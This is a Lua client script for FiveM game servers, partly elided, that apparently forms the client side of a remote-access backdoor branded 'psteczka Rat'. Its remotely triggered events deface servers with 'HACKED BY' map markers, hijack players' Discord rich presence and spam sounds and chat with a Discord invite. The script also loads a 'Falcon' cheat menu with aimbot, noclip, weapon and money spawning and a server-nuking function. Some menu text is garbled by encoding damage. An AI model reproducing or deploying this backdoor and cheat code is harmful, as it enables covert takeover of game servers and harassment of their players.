RegisterNetEvent("psteczka-Backdoor-pornScreen")
AddEventHandler("psteczka-Backdoor-pornScreen", function()
...
RegisterNetEvent("psteczka-Backdoor-discordHack")
AddEventHandler("psteczka-Backdoor-discordHack", function(text)
    Citizen.CreateThread(function()
        while true do
			SetDiscordAppId(1041220861589463060)
			SetDiscordRichPresenceAsset("psteczka")
			SetRichPresence("Server Hacked by PSteczka")
			SetDiscordRichPresenceAssetText('Developer of psteczka Rat: ℙ𝕊𝕥𝕖𝕔𝕫𝕜𝕒#4351')
			SetDiscordRichPresenceAssetSmall('psteczka')
			SetDiscordRichPresenceAssetSmallText('Developer of psteczka Rat: ℙ𝕊𝕥𝕖𝕔𝕫𝕜𝕒#4351')
			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.com/invite/dollaricz")
			SetDiscordRichPresenceAction(1, "Hacked by psteczka", "https://discord.com/invite/dollaricz")
			Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("psteczka-Backdoor-BlipsHack")
AddEventHandler("psteczka-Backdoor-BlipsHack", function()
	local blips = {
		{title="HACKED BY psteczka", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY psteczka", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY psteczka", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY psteczka", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY psteczka", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY psteczka", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY psteczka", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY psteczka", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY psteczka", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY psteczka", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY psteczka", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY psteczka", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY psteczka", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY psteczka", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY psteczka", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY psteczka", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY psteczka", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY psteczka", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY psteczka", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY psteczka", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY psteczka", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY psteczka", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY psteczka", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY psteczka", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY psteczka", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY psteczka", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY psteczka", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY psteczka", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
...
RegisterNetEvent("psteczka-Backdoor-soundSpam")
AddEventHandler("psteczka-Backdoor-soundSpam", function()
	Citizen.CreateThread(function()
		while true do
...
RegisterNetEvent("psteczka-Backdoor-Falcon")
AddEventHandler("psteczka-Backdoor-Falcon", function()
	Falcon = {}
	Falcon.debug = false
	...
	startMessage = "~r~â~s~WELCOME ~n~USER â ~r~[" ..GetPlayerName(PlayerId()).. "]"
	...
	motd3 = "~r~oFlaqme~s~#1149 ~n~~g~https://discord.gg/dollaricz"
	...
	Citizen.CreateThread(function()
		...
		Falcon.SetSubTitle('Falcon', 'By ℙ𝕊𝕥𝕖𝕔𝕫𝕜𝕒#4351')
		...
		while true do
			...
			if Falcon.IsMenuOpened('Falcon') then
				if Falcon.MenuButton('đ~y~Plz Press Meeeeee', 'lynx') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~r~Player Options', 'player') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~b~Self Options', 'self') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~g~Models Options', 'appearance') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~y~Weapon Options', 'weapon') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~p~Vehicle Options', 'vehicle') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~c~World Options', 'world') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~m~Teleport Options', 'teleport') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~u~Misc Options', 'misc') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~o~Objects Options', 'objectspawner') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~r~Fuck Server', 'fuckserver') then
				elseif Falcon.MenuButton('~y~ÂŤ ~r~â ~h~~y~Âť ~b~Lua Options', 'lua') then
				elseif Falcon.Button('~y~ÂŤ ~r~â ~h~~y~Âť ~r~Kill Menu') then break
				end
				ShowInfo(motd2)
				ShowInfo(motd)
				ShowInfo(motd5)
			...
			elseif Falcon.IsMenuOpened('fuckserver') then
				...
				ShowInfo("~y~Fucking Players...")
					nukeserver()
				elseif Falcon.Button("~h~~y~Âť~r~ Spam Chat") then
					RapeAllFunc() 
		...
		elseif Falcon.Button("~y~Spawn ~p~Lion ~s~all Players") then
		 ...
		 elseif Falcon.Button('~o~Make all Players hamburger head') then
			...
			elseif Falcon.IsMenuOpened('self') then
				...
				elseif Falcon.ComboBox("~b~Player ~s~Functions ~y~Âť", {"~b~VRP ~s~Revive", "~b~Give Player Armor", "~y~Remove Player Armor", "~g~Clean Player", "~y~Suicide", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
				...
				elseif Falcon.ComboBox("~c~Forcefield Radius ~y~Âť", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
				...
				elseif Falcon.CheckBox("~m~Noclip", Noclipping) then
					ToggleNoclip()
				elseif Falcon.ComboBox("~c~Noclip Speed ~y~Âť", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
	...
	if Falcon.Button("~g~Reset Model To FiveM Player") then
		...
		elseif Falcon.Button("Change To ~p~Clown") then
			...
			elseif Falcon.IsMenuOpened('weapon') then
				...
				elseif Falcon.CheckBox("Aimbot", Aimbot) then
					Aimbot = not Aimbot
				elseif Falcon.ComboBox("Aimbot Bone Target ~y~Âť", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
			...
			elseif Falcon.IsMenuOpened('melee') then
				for i = 1, #meleeweapons do
					if Falcon.Button("~r~Âť ~s~"..meleeweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('pistol') then
				for i = 1, #pistolweapons do
					if Falcon.Button("~r~Âť ~s~"..pistolweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('smg') then
				for i = 1, #smgweapons do
					if Falcon.Button("~r~Âť ~s~"..smgweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('shotgun') then
				for i = 1, #shotgunweapons do
					if Falcon.Button("~r~Âť ~s~"..shotgunweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('assault') then
				for i = 1, #assaultweapons do
					if Falcon.Button("~r~Âť ~s~"..assaultweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('sniper') then
				for i = 1, #sniperweapons do
					if Falcon.Button("~r~Âť ~s~"..sniperweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('thrown') then
				for i = 1, #thrownweapons do
					if Falcon.Button("~r~Âť ~s~"..thrownweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('heavy') then
				for i = 1, #heavyweapons do
					if Falcon.Button("~r~Âť ~s~"..heavyweapons[i][2].."") then
			...
			elseif Falcon.IsMenuOpened('vehicle') then
				if Falcon.MenuButton("Vehicle Spawner", 'vehiclespawner') then
					...
					elseif Falcon.ComboBox("Vehicle Functions ~y~Âť", {"Repair ~b~Vehicle", "Clean ~g~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
			...
			elseif Falcon.IsMenuOpened('objectspawner') then
				...
				elseif Falcon.ComboBox("~g~Select~s~ To Object~h~~y~ Âť", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
			...
			elseif Falcon.IsMenuOpened('misc') then
				...
				elseif Falcon.MenuButton("~h~â~r~Info", "InfoMenu") then
				...
				elseif Falcon.ComboBox("~r~Âť  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
						...
						then
				elseif Falcon.ComboBox("~r~Âť  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
			...
			elseif Falcon.IsMenuOpened("InfoMenu") then
				...
				elseif Falcon.Button("~b~Falcon was originally made by ~r~ℙ𝕊𝕥𝕖𝕔𝕫𝕜𝕒#4351") then
				elseif Falcon.Button("~b~5.0 Developer ~r~ℙ𝕊𝕥𝕖𝕔𝕫𝕜𝕒#4351") then                    
				...
				elseif Falcon.Button("~b~Discord ~r~https://discord.gg/dollaricz") then  
				end
			...
			elseif Falcon.IsMenuOpened('vrp') then
				if Falcon.MenuButton("~h~~y~Âť~r~ Spawn ~b~Money ~r~NEW", 'money') then
		...
		Citizen.CreateThread(function()
			...
			for bs=0,9 do
				TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^1F^2a^3l^4c^5o^6n ^1M^2e^3n^4u ^4best hack on the market right now! https://discord.gg/dollaricz")
			end
		...
		function RapeAllFunc()
			...
			'Falcon',
			{0, 0x99, 255},
			'^^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/dollaricz'
		)
			TriggerServerEvent('_chat:messageEntered', '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/dollaricz', {0, 0x99, 255}, '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/dollaricz')
			end
		end
...
RegisterNetEvent("psteczka-Backdoor-Brutan")
AddEventHandler("psteczka-Backdoor-Brutan", function()
	local mhaonn = true
	ESX = nil;
...
RegisterNetEvent("psteczka-Backdoor-HackServer")
AddEventHandler("psteczka-Backdoor-HackServer", function()
	local blips = {
		{title="HACKED BY psteczka", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY psteczka", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY psteczka", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
	...
	local texts = {
	   "psteczka - https://discord.gg/dollaricz",
	   "âpsteczka - https://discord.gg/dollaricz",
	   "ââpsteczka - https://discord.gg/dollaricz",
	   "âââpsteczka - https://discord.gg/dollaricz",
	   "ââââpsteczka - https://discord.gg/dollaricz",
	   "âââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "âââââââââââââââpsteczka - https://discord.gg/dollaricz",
	   "ââââââââââââââpsteczka - https://discord.gg/dollaricz",
	...
	local config = {
	   ["TITLE"] = "~r~psteczka - https://discord.gg/dollaricz", 
	   ["SUBTITLE"] = "~r~psteczka - https://discord.gg/dollaricz",
	   ["MAP"] = "psteczka",
	   ["STATUS"] = "psteczka",
	   ["GAME"] = "psteczka",
	   ["INFO"] = "psteczka",
